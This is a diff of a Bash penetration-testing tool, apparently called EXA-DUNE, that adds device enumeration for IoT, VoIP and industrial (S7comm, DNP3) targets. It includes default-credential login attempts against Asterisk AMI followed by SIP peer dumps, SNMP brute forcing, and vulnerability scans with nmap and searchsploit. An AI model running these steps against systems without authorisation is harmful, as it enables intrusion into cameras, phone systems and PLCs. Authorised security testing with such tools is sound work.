+                echo "   23.  SIP-ALG pinhole (INVITE/REGISTER/OPTIONS)"
+                echo "   24.  FTP ALG PORT command pinhole"
+                echo "   25.  HTTP CONNECT proxy tunnel"
+                echo "   26.  IPv6 link-local e globale (AAAA DNS)"
+                echo "   27.  Protocol confusion (SSH su 443, SIP su 80, HTTP su 22)"
+                echo "   28.  ICMP tipo 13 (Timestamp) e 17 (Netmask)"
+                echo "   29.  SNMP recon (interfacce, routing, tcpConnTable) — community: ${_known_comm:-N/D}"
+                echo "   30.  IoT vendor-specific port probe (Dahua/Hikvision/Reolink/MikroTik/TR-069...)"
+                echo "   31.  Port knocking (10 sequenze comuni IoT/embedded)"
+                echo "   32.  Full port scan TCP 1-65535 (T2, slow)"
+                [[ -n "$_snmp_extra_ips" ]] && \
+                    echo "   NOTA: IP aggiuntivi rilevati via SNMP: $_snmp_extra_ips — non scansionati automaticamente"
                 echo ""
                 echo "CONCLUSIONE: dispositivo non raggiungibile o completamente filtrato"
             } > "$OUTDIR_BASE/no_access_summary.txt" 2>/dev/null || true
@@ -8486,6 +8848,7 @@ cmd_auto() {
     # ─────────────────────────────────────────────────────────
     # FASE 2 — ENUMERAZIONE
     # ─────────────────────────────────────────────────────────
+    _phase_num=2
     echo ""
     echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
     echo -e "${BOLD}${CYAN}  FASE 2 — ENUMERAZIONE                   ${NC}"
@@ -8496,11 +8859,38 @@ cmd_auto() {
     # DNS hostname, mDNS/WSD findings — tutto in minuscolo per match uniforme
     local prescan_context=""
     if [[ $DRY_RUN -eq 0 ]]; then
-        prescan_context+=" $(grep -i "^Server:" "$prescan_dir/http_head.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
-        prescan_context+=" $(grep -i "subject\|issuer\|O=" "$prescan_dir/ssl_cert.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
-        prescan_context+=" $(grep -i "sysDescr" "$prescan_dir/snmp_quick.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # HTTP headers: Server, X-Powered-By, WWW-Authenticate realm, header vendor-specifici
+        prescan_context+=" $(grep -i "^Server:\|^X-Powered-By:\|^WWW-Authenticate:\|^X-Application:\|^X-Device-Model:" \
+            "$prescan_dir/http_head.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # SSL CN/O/SAN
+        prescan_context+=" $(grep -i "subject\|issuer\|O=\|CN=\|SAN" \
+            "$prescan_dir/ssl_cert.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # SNMP sysDescr + sysObjectID + sysName
+        prescan_context+=" $(grep -i "sysDescr\|sysObjectID\|sysName\|sysContact" \
+            "$prescan_dir/snmp_quick.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # SNMP OID enterprise prefix → vendor mapping
+        local _snmp_oid; _snmp_oid=$(grep -oP '(?<=sysObjectID=)[\d.]+' \
+            "$prescan_dir/snmp_quick.txt" 2>/dev/null | head -1 || true)
+        case "$_snmp_oid" in
+            1.3.6.1.4.1.591.*)   prescan_context+=" audiocodes voip" ;;
+            1.3.6.1.4.1.368.*)   prescan_context+=" axis camera" ;;
+            1.3.6.1.4.1.507.*)   prescan_context+=" hikvision camera" ;;
+            1.3.6.1.4.1.2560.*)  prescan_context+=" dahua camera" ;;
+            1.3.6.1.4.1.39165.*) prescan_context+=" reolink camera" ;;
+            1.3.6.1.4.1.3352.*)  prescan_context+=" commend voip" ;;
+        esac
+        # DNS hostname
         prescan_context+=" $(echo "$dns_hostname" | tr '[:upper:]' '[:lower:]')"
-        prescan_context+=" $(cat "$OUTDIR_BASE/mdns/findings.txt" "$OUTDIR_BASE/wsd/findings.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # mDNS / WS-Discovery findings
+        prescan_context+=" $(cat "$OUTDIR_BASE/mdns/findings.txt" \
+            "$OUTDIR_BASE/wsd/findings.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
+        # UPnP deviceType da XML WSD (se disponibile)
+        local _wsd_xml; _wsd_xml=$(find "$OUTDIR_BASE/wsd" -name "*.xml" 2>/dev/null | head -1 || true)
+        [[ -n "$_wsd_xml" ]] && \
+            prescan_context+=" $(grep -oiP '(?<=<d:deviceType>|<deviceType>)[^<]+' "$_wsd_xml" 2>/dev/null \
+                | tr '[:upper:]' '[:lower:]' || true)"
+        # MAC vendor OUI (già noto da pre-scan)
+        [[ -n "$mac_vendor" ]] && prescan_context+=" $(echo "$mac_vendor" | tr '[:upper:]' '[:lower:]')"
     fi
 
     # Mappa contesto → vendor (usato per cam-cve e moduli specializzati)
@@ -8536,8 +8926,63 @@ cmd_auto() {
         _run_mod "JS analysis" js "$target" \
             --port "$( _port_open 443 && echo 443 || _port_open 80 && echo 80 || echo 8080 )" && \
         ran_enum=1
+    # ── Web su porte dinamiche (HTTP auto-detection) ─────────
+    # Per ogni porta TCP aperta non già coperta dalle porte web standard,
+    # testa HTTP/HTTPS e se risponde lancia il modulo web
+    local _web_std_ports=" 80 443 8000 8080 8443 "
+    if [[ $DRY_RUN -eq 0 ]]; then
+        for _wp in $open_tcp; do
+            echo "$_web_std_ports" | grep -qw "$_wp" && continue
+            local _wp_scheme=""
+            if curl -sI --connect-timeout 3 --max-time 5 \
+                    "http://$target:$_wp/" 2>/dev/null | grep -qi "^HTTP/"; then
+                _wp_scheme="http"
+            elif curl -skI --connect-timeout 3 --max-time 5 \
+                    "https://$target:$_wp/" 2>/dev/null | grep -qi "^HTTP/"; then
+                _wp_scheme="https"
+            fi
+            if [[ -n "$_wp_scheme" ]]; then
+                found MEDIUM "HTTP auto-detect — porta $_wp risponde a $_wp_scheme"
+                _run_mod "Web $_wp_scheme :$_wp (auto)" web "$target" --port "$_wp" --scheme "$_wp_scheme"
+                ran_enum=1
+            fi
+        done
+    fi
+
     # SIP/VoIP
     { _port_open 5060 || _port_open 5061; } && _run_mod "SIP/VoIP" sip "$target" && ran_enum=1
+
+    # ── SIP over WebSocket (SIP/WS e SIP/WSS) ─────────────────
+    if { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; }; then
+        log "  ▶ [Fase 2/4] SIP over WebSocket probe"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _sipws_dir="$OUTDIR_BASE/sip_websocket"
+            mkdir -p "$_sipws_dir"
+            local _found_sipws=0
+            for _swport in 80 8080 443 8443; do
+                _port_open "$_swport" || continue
+                # Path comuni: /ws /sip /sipws /call /ws/sip /webrtc
+                for _wspath in /ws /sip /sipws /call /ws/sip /webrtc; do
+                    local _ws_resp
+                    _ws_resp=$(printf 'GET %s HTTP/1.1\r\nHost: %s:%s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: sip\r\n\r\n' \
+                        "$_wspath" "$target" "$_swport" | \
+                        timeout 5 nc -w 4 "$target" "$_swport" 2>/dev/null | head -10 || true)
+                    echo "=== SIP/WS :${_swport}${_wspath} ===" >> "$_sipws_dir/sipws_probe.txt"
+                    echo "$_ws_resp" >> "$_sipws_dir/sipws_probe.txt"
+                    if echo "$_ws_resp" | grep -qi "101\|Switching\|websocket"; then
+                        found HIGH "SIP/WS — WebSocket upgrade su :${_swport}${_wspath} con protocollo SIP"
+                        prescan_context+=" sip voip websocket"; is_voip=1
+                        _found_sipws=$((_found_sipws+1))
+                    fi
+                done
+            done
+            [[ $_found_sipws -eq 0 ]] && log "  SIP over WebSocket: nessun endpoint WS rilevato"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} SIP/WS probe su porte 80/443/8080/8443 (HTTP Upgrade, Sec-WebSocket-Protocol: sip)"
+        fi
+        ran_enum=1
+    fi
+
     # SSH
     _port_open 22   && _run_mod "SSH     :22"   ssh    "$target" && ran_enum=1
     # Telnet
@@ -8584,6 +9029,191 @@ cmd_auto() {
     _port_open 389  && _run_mod "LDAP    :389"   ldap   "$target" && ran_enum=1
     _port_open 636  && _run_mod "LDAPS   :636"   ldap   "$target" && ran_enum=1
 
+    # ── Porte non-standard per protocolli noti ──────────────────
+    # SSH su porte alternative (embedded/IoT spesso usano 2222/2200)
+    _port_open 2222 && _run_mod "SSH :2222"    ssh    "$target" --port 2222 && ran_enum=1
+    _port_open 2200 && _run_mod "SSH :2200"    ssh    "$target" --port 2200 && ran_enum=1
+    # Telnet su porte alternative (2323 comune su router/IoT, 4567 su VoIP)
+    _port_open 2323 && _run_mod "Telnet :2323" telnet "$target" --ports 2323 && ran_enum=1
+    _port_open 4567 && _run_mod "Telnet :4567" telnet "$target" --ports 4567 && ran_enum=1
+    # RTSP su porte alternative (Reolink 10554/8899, Hikvision 8554 già coperta)
+    _port_open 10554 && _run_mod "RTSP :10554" rtsp "$target" --port 10554 && ran_enum=1
+    _port_open 8899  && _run_mod "RTSP :8899"  rtsp "$target" --port 8899  && ran_enum=1
+    # MQTT over TLS (8883)
+    _port_open 8883  && _run_mod "MQTT TLS :8883" mqtt "$target" --port 8883 && ran_enum=1
+
+    # Asterisk AMI (5038) — inline (nessun modulo dedicato)
+    if _port_open 5038; then
+        log "  ▶ [Fase 2/4] Asterisk AMI :5038"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _ami_dir="$OUTDIR_BASE/asterisk_ami"
+            mkdir -p "$_ami_dir"
+            # Banner grab — Asterisk risponde con "Asterisk Call Manager/X.Y"
+            local _ami_banner
+            _ami_banner=$(timeout 5 nc -w 3 "$target" 5038 </dev/null 2>/dev/null | head -5 || true)
+            echo "$_ami_banner" > "$_ami_dir/banner.txt"
+            if echo "$_ami_banner" | grep -qi "Asterisk"; then
+                local _ami_ver; _ami_ver=$(echo "$_ami_banner" | grep -oP 'Asterisk[^\r\n]+' | head -1 || true)
+                found HIGH "Asterisk AMI:5038 — $_ami_ver"
+                is_voip=1
+                # Tenta login con credenziali default
+                for _cred_pair in "admin:admin" "admin:" "manager:manager" "admin:password" "asterisk:asterisk"; do
+                    local _ami_u="${_cred_pair%%:*}" _ami_p="${_cred_pair#*:}"
+                    local _ami_login
+                    _ami_login=$(printf 'Action: Login\r\nUsername: %s\r\nSecret: %s\r\n\r\n' \
+                        "$_ami_u" "$_ami_p" | timeout 5 nc -w 4 "$target" 5038 2>/dev/null | head -5 || true)
+                    echo "$_ami_login" >> "$_ami_dir/login_${_ami_u}.txt"
+                    if echo "$_ami_login" | grep -qi "Response: Success"; then
+                        found CRITICAL "Asterisk AMI:5038 — Login con ${_ami_u}:${_ami_p} RIUSCITO"
+                        # Dump estensioni/peer via AMI
+                        printf 'Action: SIPpeers\r\n\r\n' | timeout 5 nc -w 4 "$target" 5038 \
+                            > "$_ami_dir/sippeers.txt" 2>/dev/null || true
+                        printf 'Action: ExtensionState\r\nExten: s\r\nContext: default\r\n\r\n' | \
+                            timeout 5 nc -w 4 "$target" 5038 \
+                            > "$_ami_dir/extstate.txt" 2>/dev/null || true
+                        break
+                    fi
+                done
+                # Accesso anonimo
+                local _ami_anon
+                _ami_anon=$(printf 'Action: Login\r\nUsername: \r\nSecret: \r\n\r\n' | \
+                    timeout 5 nc -w 4 "$target" 5038 2>/dev/null | head -5 || true)
+                echo "$_ami_anon" | grep -qi "Response: Success" && \
+                    found CRITICAL "Asterisk AMI:5038 — Accesso anonimo RIUSCITO"
+            else
+                found LOW "Porta 5038 aperta ma non è Asterisk AMI (banner: $(echo "$_ami_banner" | head -1 | tr -d '\r'))"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} Asterisk AMI :5038 (banner + login default + SIPpeers dump)"
+        fi
+        ran_enum=1
+    fi
+
+    # ── Protocolli addizionali IoT/VoIP/Industrial ────────────────
+
+    # DLNA / UPnP media server (porta 8200)
+    if _port_open 8200; then
+        log "  ▶ [Fase 2/4] DLNA/UPnP media server :8200"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _dlna_dir="$OUTDIR_BASE/dlna"
+            mkdir -p "$_dlna_dir"
+            local _dlna_desc
+            _dlna_desc=$(curl -s --max-time 5 "http://$target:8200/rootDesc.xml" 2>/dev/null || true)
+            if [[ -n "$_dlna_desc" ]]; then
+                echo "$_dlna_desc" > "$_dlna_dir/rootDesc.xml"
+                local _dlna_mfr; _dlna_mfr=$(echo "$_dlna_desc" | grep -oP '(?<=<manufacturer>)[^<]+' | head -1 || true)
+                local _dlna_mdl; _dlna_mdl=$(echo "$_dlna_desc" | grep -oP '(?<=<modelName>)[^<]+'    | head -1 || true)
+                local _dlna_fn;  _dlna_fn=$(echo  "$_dlna_desc" | grep -oP '(?<=<friendlyName>)[^<]+' | head -1 || true)
+                found MEDIUM "DLNA:8200 — media server esposto: $_dlna_mfr $_dlna_mdl (${_dlna_fn})"
+                [[ -n "$_dlna_mfr" ]] && prescan_context+=" $(echo "$_dlna_mfr $_dlna_mdl" | tr '[:upper:]' '[:lower:]')"
+                # Content Directory browse (senza auth)
+                local _cds_resp
+                _cds_resp=$(curl -s --max-time 8 -X POST "http://$target:8200/ctl/ContentDir" \
+                    -H 'Content-Type: text/xml' \
+                    -H 'SOAPACTION: "urn:schemas-upnp-org:service:ContentDirectory:1#Browse"' \
+                    -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1"><ObjectID>0</ObjectID><BrowseFlag>BrowseDirectChildren</BrowseFlag><Filter>*</Filter><StartingIndex>0</StartingIndex><RequestedCount>10</RequestedCount><SortCriteria></SortCriteria></u:Browse></s:Body></s:Envelope>' \
+                    2>/dev/null || true)
+                echo "$_cds_resp" > "$_dlna_dir/cds_browse.xml"
+                echo "$_cds_resp" | grep -qi "BrowseResponse\|Result" && \
+                    found MEDIUM "DLNA:8200 — Content Directory navigabile senza autenticazione"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} DLNA rootDesc.xml + ContentDirectory browse :8200"
+        fi
+        ran_enum=1
+    fi
+
+    # STUN (UDP 3478) — infrastruttura VoIP
+    if _port_open 3478; then
+        log "  ▶ [Fase 2/4] STUN :3478"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _stun_dir="$OUTDIR_BASE/stun"
+            mkdir -p "$_stun_dir"
+            nmap -sU -p 3478 --script stun-info \
+                -oN "$_stun_dir/stun_info.txt" "$target" 2>/dev/null || true
+            grep -qi "stun\|binding\|mapped" "$_stun_dir/stun_info.txt" 2>/dev/null && \
+                found LOW "STUN:3478 — server VoIP rilevato" && is_voip=1
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} nmap -sU -p3478 --script stun-info $target"
+        fi
+        ran_enum=1
+    fi
+
+    # MGCP (UDP 2427) — VoIP Media Gateway Control Protocol
+    if _port_open 2427; then
+        log "  ▶ [Fase 2/4] MGCP :2427"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _mgcp_dir="$OUTDIR_BASE/mgcp"
+            mkdir -p "$_mgcp_dir"
+            nmap -sU -p 2427 --script mgcp-request \
+                -oN "$_mgcp_dir/mgcp_info.txt" "$target" 2>/dev/null || true
+            if grep -qi "mgcp\|endpoint\|AUEP\|200" "$_mgcp_dir/mgcp_info.txt" 2>/dev/null; then
+                found MEDIUM "MGCP:2427 — gateway VoIP risponde (endpoint enumeration possibile)"
+                prescan_context+=" voip mgcp"; is_voip=1
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} nmap -sU -p2427 --script mgcp-request $target"
+        fi
+        ran_enum=1
+    fi
+
+    # H.248/Megaco (TCP 2944) — VoIP gateway protocol
+    if _port_open 2944; then
+        log "  ▶ [Fase 2/4] H.248/Megaco :2944"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _h248_dir="$OUTDIR_BASE/h248"
+            mkdir -p "$_h248_dir"
+            local _h248_banner
+            _h248_banner=$(printf '\x00\x00\x00\x01' | timeout 5 nc -q 2 "$target" 2944 2>/dev/null | xxd 2>/dev/null | head -5 || true)
+            if [[ -n "$_h248_banner" ]]; then
+                echo "$_h248_banner" > "$_h248_dir/banner.txt"
+                found LOW "H.248/Megaco:2944 — gateway VoIP risponde"
+                prescan_context+=" voip megaco h248"; is_voip=1
+            fi
+            nmap -p 2944 --script banner \
+                -oN "$_h248_dir/nmap_banner.txt" "$target" 2>/dev/null || true
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} H.248/Megaco banner probe :2944"
+        fi
+        ran_enum=1
+    fi
+
+    # S7comm / Profinet (TCP 102) — PLC Siemens
+    if _port_open 102; then
+        log "  ▶ [Fase 2/4] S7comm/Profinet :102"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _s7_dir="$OUTDIR_BASE/s7comm"
+            mkdir -p "$_s7_dir"
+            nmap -p 102 --script s7-info \
+                -oN "$_s7_dir/s7_info.txt" "$target" 2>/dev/null || true
+            if grep -qi "S7\|Siemens\|PLC\|CPU\|Module" "$_s7_dir/s7_info.txt" 2>/dev/null; then
+                found HIGH "S7comm:102 — PLC Siemens identificato (Profinet/S7)"
+                grep -oP 'Module.*|System.*|Plant.*|Hardware.*|Firmware.*' \
+                    "$_s7_dir/s7_info.txt" 2>/dev/null | head -5 | \
+                    while IFS= read -r _l; do found MEDIUM "S7comm:102 — $_l"; done || true
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} nmap -p102 --script s7-info $target"
+        fi
+        ran_enum=1
+    fi
+
+    # DNP3 (TCP/UDP 20000) — SCADA/ICS
+    if _port_open 20000; then
+        log "  ▶ [Fase 2/4] DNP3 :20000"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _dnp3_dir="$OUTDIR_BASE/dnp3"
+            mkdir -p "$_dnp3_dir"
+            nmap -p 20000 --script dnp3-info \
+                -oN "$_dnp3_dir/dnp3_info.txt" "$target" 2>/dev/null || true
+            grep -qi "dnp3\|device\|vendor\|firmware" "$_dnp3_dir/dnp3_info.txt" 2>/dev/null && \
+                found HIGH "DNP3:20000 — dispositivo SCADA/ICS rilevato"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} nmap -p20000 --script dnp3-info $target"
+        fi
+        ran_enum=1
+    fi
+
     # ── Moduli vendor-specifici (da contesto pre-scan) ───────
     if [[ -n "$detected_vendor" ]]; then
         _run_mod "CVE Scanner ($detected_vendor)" cam-cve "$target" --vendor "$detected_vendor" && ran_enum=1
@@ -8595,11 +9225,138 @@ cmd_auto() {
     [[ $is_voip -eq 1 && -n "$detected_vendor" ]] && \
         _run_mod "CVE Scanner VoIP ($detected_vendor)" cam-cve "$target" --vendor "$detected_vendor" && ran_enum=1
 
+    # ── nmap NSE scripts mirati post-discovery ─────────────────
+    log "▶ [Fase 2/4] NSE scripts mirati in base ai servizi trovati..."
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local _nse_dir="$OUTDIR_BASE/nse_targeted"
+        mkdir -p "$_nse_dir"
+
+        # HTTP
+        local _http_nse_ports=""
+        for _np in $open_tcp; do
+            echo " 80 443 8000 8080 8443 " | grep -qw "$_np" && _http_nse_ports="${_http_nse_ports},${_np}"
+        done
+        _http_nse_ports="${_http_nse_ports#,}"
+        if [[ -n "$_http_nse_ports" ]]; then
+            log "  NSE HTTP ($http_nse_ports)"
+            nmap -p "$_http_nse_ports" \
+                --script http-auth-finder,http-auth,http-default-accounts,\
+http-methods,http-headers,http-robots.txt,http-server-header \
+                $NMAP_TIMING -oN "$_nse_dir/http_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "valid credentials\|default.*credentials\|admin.*pass" \
+                "$_nse_dir/http_nse.nmap" 2>/dev/null && \
+                found CRITICAL "NSE — Credenziali HTTP di default trovate"
+            grep -qi "TRACE\|^  PUT\|^  DELETE" \
+                "$_nse_dir/http_nse.nmap" 2>/dev/null && \
+                found HIGH "NSE — Metodi HTTP pericolosi abilitati (TRACE/PUT/DELETE)"
+        fi
+
+        # FTP
+        _port_open 21 && {
+            log "  NSE FTP"
+            nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst \
+                $NMAP_TIMING -oN "$_nse_dir/ftp_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "Anonymous.*allowed\|ftp-anon: Anonymous" \
+                "$_nse_dir/ftp_nse.nmap" 2>/dev/null && \
+                found CRITICAL "NSE — FTP accesso anonimo confermato"
+        }
+
+        # SSH
+        { _port_open 22 || _port_open 2222 || _port_open 2200; } && {
+            local _ssh_nse_p; _ssh_nse_p=$(for _sp in 22 2222 2200; do _port_open "$_sp" && echo "$_sp"; done | tr '\n' ',' | sed 's/,$//')
+            log "  NSE SSH ($_ssh_nse_p)"
+            nmap -p "$_ssh_nse_p" --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
+                $NMAP_TIMING -oN "$_nse_dir/ssh_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "arcfour\|3des-cbc\|diffie-hellman-group1\|diffie-hellman-group14-sha1" \
+                "$_nse_dir/ssh_nse.nmap" 2>/dev/null && \
+                found MEDIUM "NSE — SSH: algoritmi crittografici deboli/obsoleti"
+            grep -qi "password" "$_nse_dir/ssh_nse.nmap" 2>/dev/null && \
+                found MEDIUM "NSE — SSH: autenticazione con password abilitata"
+        }
+
+        # SMB
+        _port_open 445 && {
+            log "  NSE SMB"
+            nmap -p 445 \
+                --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-security-mode,\
+smb-system-info,smb2-security-mode \
+                $NMAP_TIMING -oN "$_nse_dir/smb_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "VULNERABLE\|State: VULNERABLE" "$_nse_dir/smb_nse.nmap" 2>/dev/null && \
+                found CRITICAL "NSE — SMB vulnerabile (EternalBlue MS17-010 / MS08-067)"
+            grep -qi "Message signing enabled but not required" \
+                "$_nse_dir/smb_nse.nmap" 2>/dev/null && \
+                found MEDIUM "NSE — SMB: signing non obbligatorio (relay attack possibile)"
+        }
+
+        # SNMP
+        { _port_open 161 || [[ -s "$prescan_dir/snmp_quick.txt" ]]; } && {
+            log "  NSE SNMP"
+            nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-interfaces \
+                $NMAP_TIMING -oN "$_nse_dir/snmp_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "valid credentials\|Account:" "$_nse_dir/snmp_nse.nmap" 2>/dev/null && \
+                found HIGH "NSE — SNMP: community string trovata via brute"
+        }
+
+        # VNC
+        _port_open 5900 && {
+            log "  NSE VNC"
+            nmap -p 5900 --script vnc-info,realvnc-auth-bypass \
+                $NMAP_TIMING -oN "$_nse_dir/vnc_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "Authentication: None\|realvnc-auth-bypass.*Vulnerable" \
+                "$_nse_dir/vnc_nse.nmap" 2>/dev/null && \
+                found CRITICAL "NSE — VNC accessibile senza autenticazione"
+        }
+
+        # RTSP
+        { _port_open 554 || _port_open 8554 || _port_open 10554 || _port_open 8899; } && {
+            local _rtsp_nse_p; _rtsp_nse_p=$(for _rp in 554 8554 10554 8899; do _port_open "$_rp" && echo "$_rp"; done | tr '\n' ',' | sed 's/,$//')
+            log "  NSE RTSP ($_rtsp_nse_p)"
+            nmap -p "$_rtsp_nse_p" --script rtsp-url-brute,rtsp-methods \
+                $NMAP_TIMING -oN "$_nse_dir/rtsp_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "200 OK\|DESCRIBE" "$_nse_dir/rtsp_nse.nmap" 2>/dev/null && \
+                found MEDIUM "NSE — RTSP: stream accessibili rilevati"
+        }
+
+        # SIP
+        { _port_open 5060 || _port_open 5061; } && {
+            log "  NSE SIP"
+            nmap -p 5060,5061 --script sip-enum-users,sip-methods \
+                $NMAP_TIMING -oN "$_nse_dir/sip_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "200 OK\|user.*found\|extension" "$_nse_dir/sip_nse.nmap" 2>/dev/null && \
+                found MEDIUM "NSE — SIP: utenti o estensioni enumerate"
+        }
+
+        # RDP
+        _port_open 3389 && {
+            log "  NSE RDP"
+            nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 \
+                $NMAP_TIMING -oN "$_nse_dir/rdp_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "VULNERABLE\|encryption.*none\|NLA.*disabled" \
+                "$_nse_dir/rdp_nse.nmap" 2>/dev/null && \
+                found HIGH "NSE — RDP: cifratura debole o vulnerabilità MS12-020"
+        }
+
+        # MQTT
+        { _port_open 1883 || _port_open 8883; } && {
+            log "  NSE MQTT"
+            nmap -p 1883,8883 --script mqtt-subscribe \
+                $NMAP_TIMING -oN "$_nse_dir/mqtt_nse.nmap" "$target" 2>/dev/null || true
+            grep -qi "CONNACK\|subscribe.*success" "$_nse_dir/mqtt_nse.nmap" 2>/dev/null && \
+                found HIGH "NSE — MQTT: broker accessibile senza autenticazione"
+        }
+
+        local _nse_total; _nse_total=$(grep -c "VULNERABLE\|CRITICAL\|found\|valid cred" \
+            "$_nse_dir"/*.nmap 2>/dev/null | grep -v ':0$' | wc -l || echo 0)
+        log "NSE mirati completati — file in: $_nse_dir ($(_ls_count "$_nse_dir" "*.nmap") script)"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} NSE mirati: http/ftp/ssh/smb/snmp/vnc/rtsp/sip/rdp/mqtt scripts su porte trovate"
+    fi
+
     # ── Banner grab su porte non gestite da moduli specifici ──
     # Lista porte coperte dai moduli sopra — tutto il resto è "unknown"
-    local _known_ports=" 21 22 23 53 69 80 161 162 389 443 445 502 554 623 636 \
-                         1883 1900 1935 3389 4443 5060 5061 5683 5900 8000 8080 \
-                         8443 8554 44818 47808 "
+    local _known_ports=" 21 22 23 53 69 80 102 161 162 389 443 445 502 554 623 636 \
+                         1883 1900 1935 2427 2944 3389 3478 4443 5060 5061 5683 5900 \
+                         8000 8080 8200 8443 8554 20000 44818 47808 "
     local _unknown_ports=""
     for _p in $open_tcp; do
         echo "$_known_ports" | grep -qw "$_p" || _unknown_ports="$_unknown_ports $_p"
@@ -8660,6 +9417,27 @@ cmd_auto() {
                 [[ -n "$_svc_line" ]] && \
                     found MEDIUM "Porta non standard aperta: $_p — $_svc_line" \
                     || found LOW "Porta non standard aperta: $_p (banner non identificato)"
+
+                # CVE lookup via searchsploit sul banner/versione rilevata
+                if command -v searchsploit &>/dev/null && [[ -n "$_svc_line" ]]; then
+                    # Estrai nome servizio e versione: es. "8080/tcp open http Apache httpd 2.4.41"
+                    local _svc_name; _svc_name=$(echo "$_svc_line" | \
+                        grep -oP '(?<=open\s)\S+\s+\S+.*' | head -1 | \
+                        sed 's/[[:space:]]\{2,\}/ /g' | cut -c1-60 || true)
+                    if [[ -n "$_svc_name" ]]; then
+                        local _ss_out; _ss_out=$(searchsploit --color=never -q \
+                            "$_svc_name" 2>/dev/null | \
+                            grep -vP '^\s*(-{5,}|Exploits:|ShellCodes:|No Results|^\s*$)' \
+                            | head -5 || true)
+                        if [[ -n "$_ss_out" ]]; then
+                            found HIGH "Banner CVE — porta $_p ($_svc_name): CVE/exploit trovati"
+                            echo "$_ss_out" | while IFS= read -r _ss_l; do
+                                found MEDIUM "  searchsploit: $_ss_l"
+                            done
+                            echo "$_ss_out" >> "$_out_file"
+                        fi
+                    fi
+                fi
             else
                 echo -e "${CYAN}[DRY-RUN]${NC} banner grab porta $_p (nmap -sV + nc + curl)"
             fi
@@ -8693,9 +9471,132 @@ cmd_auto() {
         fi
     fi
 
+    # ── Device profile consolidato ───────────────────────────
+    log "▶ [Fase 2/4] Generazione device profile..."
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local _dp_file="$OUTDIR_BASE/device_profile.txt"
+        {
+            echo "╔══════════════════════════════════════════════════════════════╗"
+            echo "║           DEVICE PROFILE — EXA-DUNE                         ║"
+            echo "╚══════════════════════════════════════════════════════════════╝"
+            echo ""
+            echo "Target      : $target"
+            echo "Data scan   : $(date)"
+            echo "Output dir  : $OUTDIR_BASE"
+            echo ""
+
+            # Identità
+            echo "── IDENTITÀ ──────────────────────────────────────────────────"
+            [[ -n "$dns_hostname" ]] && echo "Hostname DNS : $dns_hostname"
+            [[ -n "$detected_vendor" ]] && echo "Vendor       : $detected_vendor"
+            [[ $is_camera -eq 1 ]] && echo "Tipo device  : IP Camera / NVR / DVR"
+            [[ $is_voip -eq 1 ]]   && echo "Tipo device  : VoIP Gateway / PBX / SIP Phone"
+            # MAC e vendor OUI
+            if [[ -f "$prescan_dir/mac.txt" ]]; then
+                local _pmac _pven
+                _pmac=$(grep -oP '(?<=mac=)\S+' "$prescan_dir/mac.txt" 2>/dev/null | head -1 || true)
+                _pven=$(grep -oP '(?<=vendor=).+' "$prescan_dir/mac.txt" 2>/dev/null | head -1 || true)
+                [[ -n "$_pmac" ]] && echo "MAC          : $_pmac"
+                [[ -n "$_pven" ]] && echo "MAC Vendor   : $_pven"
+            fi
+            # SSL cert CN/O
+            if [[ -s "$prescan_dir/ssl_cert.txt" ]]; then
+                echo "SSL CN/O     : $(grep -oP '(?<=CN\s=\s|O\s=\s)[^,/]+' \
+                    "$prescan_dir/ssl_cert.txt" 2>/dev/null | head -3 | tr '\n' ' ' || true)"
+            fi
+            echo ""
+
+            # Porte aperte
+            echo "── PORTE ─────────────────────────────────────────────────────"
+            echo "TCP aperte   :${open_tcp:- (nessuna)}"
+            echo "UDP aperte   :${open_udp:- (nessuna)}"
+            # Servizi nmap -sV se disponibili
+            local _svc_nmap; _svc_nmap=$(find "$OUTDIR_BASE" -name "*.nmap" 2>/dev/null | \
+                xargs grep -hE "^[0-9]+/tcp\s+open" 2>/dev/null | sort -u | head -20 || true)
